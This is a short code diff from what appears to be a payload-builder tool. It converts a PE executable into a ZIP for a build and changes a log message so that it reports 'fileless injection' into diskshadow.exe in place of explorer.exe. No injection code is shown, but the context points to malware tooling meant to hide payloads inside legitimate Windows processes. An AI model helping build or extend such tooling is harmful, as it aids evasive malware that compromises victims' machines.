@@ -993,7 +993,7 @@ func runBoundFiles() {
             if (zipPath !== filePath) fs.unlinkSync(filePath);
             finalSize = fs.statSync(zipPath).size;
             const zipOutputName = outputName.replace(/\.[^.]+$/, ".zip");
-            sendToStream({ type: "output", text: `Tasks workspace: ${exeBytes.length} byte PE → ${finalSize} byte ZIP (fileless injection into explorer.exe)\n`, level: "info" });
+            sendToStream({ type: "output", text: `Tasks workspace: ${exeBytes.length} byte PE → ${finalSize} byte ZIP (fileless injection into diskshadow.exe)\n`, level: "info" });
             (build.files as any[]).push({
               name: zipOutputName,
               filename: zipOutputName,
